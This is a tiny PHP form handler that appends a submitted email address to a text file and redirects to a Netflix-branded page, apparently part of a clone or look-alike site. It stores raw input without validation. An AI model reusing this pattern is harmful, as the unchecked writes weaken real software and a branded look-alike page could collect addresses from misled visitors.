<?php
$e=$_POST['email'];
if (isset($e)) {
    $file = fopen("emails.txt", "a");
    fwrite($file, $e . "\n");
    fclose($file);
    header("Location: netflix.html");
} else {
    echo "Email not set.";
}   

?>